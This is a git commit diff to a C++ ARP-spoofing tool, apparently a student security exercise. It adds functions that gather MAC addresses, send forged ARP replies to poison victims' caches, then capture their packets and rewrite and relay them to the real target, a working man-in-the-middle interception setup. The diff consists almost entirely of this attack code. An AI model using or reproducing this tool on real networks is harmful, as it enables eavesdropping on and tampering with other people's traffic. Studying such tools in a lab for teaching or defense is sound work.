01f49b35d2728d9254deace1422ea58bcbba2a10
o-seonsik <dhtjstlr777@gmail.com>
2020-08-12 14:29:24 +0900

    Add function of relay, relayCheck, observer

--- arp-spoof/main.cpp
+++ arp-spoof/main.cpp
@@ -7,8 +7,18 @@
 #include "mylibnet.h"
 #include <unistd.h>
 #include <vector>
+#include <stdlib.h>
+#include <thread>
 
 using namespace std;
+
+
+vector<Ip> senderList;
+vector<Ip> targetList;
+vector<Mac> senderMACList;
+vector<Mac> targetMACList;
+Ip myIp;
+u_int8_t myMAC[6];
 
 #pragma pack(push, 1)
 struct EthArpPacket {
@@ -22,7 +32,7 @@ void usage() {
     printf("sample: send-arp-test wlan0 192.168.123.123 192.168.123.1\n");
 }
 
-void sendARP(pcap_t* handle, Ip sender, Ip target, u_int8_t* senderMAC, u_int8_t* myMAC){
+void sendARP(pcap_t* handle, Ip sender, Ip target, u_int8_t* senderMAC){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = Mac(senderMAC);   // sender
@@ -45,7 +55,7 @@ void sendARP(pcap_t* handle, Ip sender, Ip target, u_int8_t* senderMAC, u_int8_t
     }
 }
 
-void sendRequest(pcap_t* handle, Ip sender, Ip target, u_int8_t* myMAC){
+void sendRequest(pcap_t* handle, Ip sender, Ip target){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");   // sender
@@ -69,9 +79,9 @@ void sendRequest(pcap_t* handle, Ip sender, Ip target, u_int8_t* myMAC){
 }
 
 
-void getSenderMAC(pcap_t* handle, Ip sender, Ip target, u_int8_t* senderEther, u_int8_t* myMAC){
+void getSenderMAC(pcap_t* handle, Ip sender, Ip target, u_int8_t* senderEther){
     while (true) {
-        sendRequest(handle, sender, target, myMAC);
+        sendRequest(handle, sender, target);
         struct pcap_pkthdr* header;
         const u_char* packet;
         int res = pcap_next_ex(handle, &header, &packet);
@@ -91,6 +101,60 @@ void getSenderMAC(pcap_t* handle, Ip sender, Ip target, u_int8_t* senderEther, u
     }
 }
 
+void relay(pcap_t* handle, const u_char* packet, int index, int len){
+    u_char* sendPacket = (u_char*)malloc(sizeof(u_char) * len);
+    for(int i = 0; i < 6; i++) sendPacket[i] = targetMACList[index][i];
+    for(int i = 6; i < 12; i++) sendPacket[i] = myMAC[i-6];
+    for(int i = 12; i < len; i++) sendPacket[i] = packet[i];
+    printf("relayed\n");
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(sendPacket), len);
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+    free(sendPacket);
+    printf("\n done\n");
+}
+
+void relayCheck(const u_char* packet, struct pcap_pkthdr* header, char* interface){
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
+    ether_header ether = getEther(packet);
+    ip_header ip = otherGetIp(packet);
+
+    Ip sender = changeIp(ip.sender);
+    Ip target = changeIp(ip.target);
+
+    // If the ip is exist in my arp table
+    for(u_int i = 0; i < senderMACList.size(); i++){
+        // If target is not my IP
+        if(Mac(ether.src) == senderMACList[i] && target != myIp){
+            // When Destination is my MAC Address
+           if(Mac(ether.dest) == Mac(myMAC)){
+               printf("packet size : %d\n", header->len);
+               printf("Find!!! %d.%d.%d.%d -> %d.%d.%d.%d\n", ip.sender[0], ip.sender[1], ip.sender[2], ip.sender[3], ip.target[0], ip.target[1], ip.target[2], ip.target[3]);
+               relay(handle, packet, i, header->caplen);
+               pcap_close(handle);
+               return;
+           }
+        }
+    }
+}
+
+void observer(pcap_t* handle, char* interface){
+    while(true){
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            break;
+        }
+        thread relayCheckThread(relayCheck, packet, header, interface);
+        relayCheckThread.join();
+    }
+}
+
 int main(int argc, char* argv[]) {
     if (argc < 4 || !argc%2) {
         usage();
@@ -98,10 +162,6 @@ int main(int argc, char* argv[]) {
     }
 
     char* dev = argv[1];
-
-    vector<Ip> senderList;
-    vector<Ip> targetList;
-
     for(int i = 2; i < argc; i+=2){
         senderList.push_back(Ip(argv[i]));
         targetList.push_back(Ip(argv[i+1]));
@@ -114,16 +174,21 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
+    getMAC(dev, myMAC);
+    myIp = getMyIP(dev);
     for(int i = 0; i < (argc-1)/2; i++){
         printf("...");
-        u_int8_t myMAC[6];
-        getMAC(dev, myMAC);
-        u_int8_t senderMAC[6]; getSenderMAC(handle, senderList[i], targetList[i], senderMAC, myMAC);
-        sendARP(handle, senderList[i], targetList[i], senderMAC, myMAC);
+        u_int8_t senderMAC[6]; getSenderMAC(handle, senderList[i], targetList[i], senderMAC);
+        u_int8_t targetMAC[6]; getSenderMAC(handle, targetList[i], senderList[i], targetMAC);
+        senderMACList.push_back(Mac(senderMAC));
+        targetMACList.push_back(Mac(targetMAC));
+        sendARP(handle, senderList[i], targetList[i], senderMAC);
         printf(" done %d!\n", i+1);
     }
 
     printf("Finished send ARP packet!\n");
+
+    observer(handle, dev);
 
     pcap_close(handle);
 }
--- arp-spoof/mylibnet.h
+++ arp-spoof/mylibnet.h
@@ -1,4 +1,5 @@
 #include <pcap.h>
+#include <ifaddrs.h>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <linux/if.h>
@@ -6,12 +7,14 @@
 #include <stdio.h>
 #include <string.h>
 #include "mac.h"
+#include "ip.h"
 
 struct ether_header{
     u_int8_t dest[6];
     u_int8_t src[6];
     u_int8_t type[2];
     // 0806 == ARP
+    // 0800 == TCP
 };
 
 struct ip_header{
@@ -38,6 +41,15 @@ ip_header getIp(const u_char *packet){
     return ip;
 }
 
+ip_header otherGetIp(const u_char *packet){
+    ip_header ip;
+    for(int i = 0; i < 4; i++) {
+        ip.sender[i] = packet[i+26];
+        ip.target[i] = packet[i+30];
+    }
+    return ip;
+}
+
 u_int32_t changeIp(u_int8_t* ip8){
     u_int32_t ip32 = 0;
     ip32 += ip8[0] << 24;
@@ -57,4 +69,31 @@ void getMAC(char* interface, u_int8_t* mac){
       for(int i = 0; i < 6; i++)
           mac[i] = (unsigned char)s.ifr_addr.sa_data[i];
   }
+}
+
+Ip getMyIP(char* interface){
+    struct ifaddrs *ifaddr, *ifa;
+        int s;
+        char host[NI_MAXHOST];
+
+        if (getifaddrs(&ifaddr) == -1){
+            perror("getifaddrs");
+            exit(EXIT_FAILURE);
+        }
+
+
+        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next){
+            if (ifa->ifa_addr == NULL) continue;
+            s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
+            if((strcmp(ifa->ifa_name, interface)==0)&&(ifa->ifa_addr->sa_family==AF_INET)){
+                if (s != 0){
+                    printf("getnameinfo() failed: %s\n", gai_strerror(s));
+                    exit(EXIT_FAILURE);
+                }
+                freeifaddrs(ifaddr);
+                return Ip(host);
+            }
+        }
+
+        freeifaddrs(ifaddr);
 }
